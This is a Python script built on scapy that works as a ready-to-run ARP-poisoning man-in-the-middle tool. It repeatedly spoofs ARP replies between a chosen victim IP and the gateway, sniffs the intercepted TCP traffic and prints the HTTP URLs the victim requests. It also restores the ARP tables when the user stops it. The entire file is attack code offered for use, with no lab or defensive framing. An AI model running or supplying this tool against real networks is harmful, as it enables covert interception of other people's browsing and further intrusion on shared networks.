#!/usr/bin/env python
from scapy.all import * 
from scapy.all import Ether, ARP, srp, send
import argparse, time, os, sys, threading
from scapy.layers.http import HTTPRequest

def process_packet(packet):
    temp = []
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        url = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', url)
        if len(url) > 0:
            url = url[0].split('%20')[0]
            ip = packet[IP].src
            if url not in temp:
                temp.append(url)
                print("\n  [*] {}: {}".format(ip,url))

class StoppableThread(threading.Thread):
    def __init__(self,  *args, **kwargs):
        super(StoppableThread, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

    def run(self):
        sniff(prn=process_packet, filter="tcp", store=0)

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def process_arguments(args):
    parser = argparse.ArgumentParser(description="Tool to find url's by ARP spoofing")
    parser.add_argument("-t", "--target", help="Victim IP Address to ARP poison")
    parser.add_argument("-g", "--gateway", help="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
    args = parser.parse_args()
    return vars(args)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        process_arguments(['-h'])
    userOptions = process_arguments(sys.argv[1:])    
    target, host, verbose = userOptions['target'], userOptions['gateway'], userOptions['verbose']

    try:
        handler = StoppableThread()
        handler.daemon = True
        handler.start()
        print ("(+) ARP poisoning started")
        while True:
            spoof(target, host, verbose)
            spoof(host, target, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! \n[!] Restoring the network, please wait...")
        restore(target, host)
        restore(host, target)
        handler.stop()
